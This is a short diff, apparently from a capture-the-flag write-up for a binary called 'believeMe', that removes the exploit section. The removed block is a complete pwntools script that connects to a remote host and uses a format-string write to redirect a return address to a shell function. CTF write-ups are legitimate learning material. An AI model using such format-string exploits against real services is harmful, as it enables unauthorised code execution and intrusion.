@@ -150,20 +150,7 @@ gdb-peda$ stack 30
 
 EXP
 
-```python
-from pwn import*
-context(os='linux',arch='i386')#,log_level='debug')
-#n = process('./believeMe')
-n = remote('18.223.228.52',13337)
 
-shell_addr = 0x804867b
-#ret_addr = 0xffffd030 - 0x4
-ret_addr = 0xffffdd30 - 0x4
-payload = fmtstr_payload(9,{ret_addr:shell_addr},write_size='short')
-n.recvuntil('But......... how ????')
-n.sendline(payload)
-n.interactive()
-```
 
 FLAG
 
